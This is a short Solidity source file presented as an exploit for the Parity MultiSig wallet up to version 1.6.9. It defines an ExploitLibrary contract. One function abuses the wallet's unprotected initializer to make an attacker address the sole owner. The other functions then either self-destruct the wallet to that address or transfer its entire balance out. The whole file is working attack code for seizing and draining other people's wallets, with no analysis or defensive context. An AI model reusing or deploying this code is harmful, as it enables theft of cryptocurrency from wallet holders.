// nimrood, 2017-07-21
// Parity MultiSig Wallet exploit up to 1.6.9
//
pragma solidity ^0.4.13;

// Parity Wallet methods
contract WalletAbi {

  function kill(address _to);
  function Wallet(address[] _owners, uint _required, uint _daylimit);
  function execute(address _to, uint _value, bytes _data) returns (bytes32 o_hash);
  
}

// Exploit a Parity MultiSig wallet
contract ExploitLibrary {
    
    // Take ownership of Parity Multisig Wallet
    function takeOwnership(address _contract, address _to) public {
        WalletAbi wallet = WalletAbi(_contract);
        address[] newOwner;
        newOwner.push(_to);
        // Partiy multisig has a bug with Wallet()
        wallet.Wallet(newOwner, 1, uint256(0-1));
    }
    
    // Empty all funds by suicide
    function killMultisig(address _contract, address _to) public {
        takeOwnership(_contract, _to);
        WalletAbi wallet = WalletAbi(_contract);
        wallet.kill(_to);
    }
    
    // Transfer funds from Multisig contract (_amount == 0 == all)
    function transferMultisig(address _contract, address _to, uint _amount) public {
        takeOwnership(_contract, _to);
        uint amt = _amount;
        WalletAbi wallet = WalletAbi(_contract);
        if (wallet.balance < amt || amt == 0)
            amt = wallet.balance;
        wallet.execute(_to, amt, "");
    }

}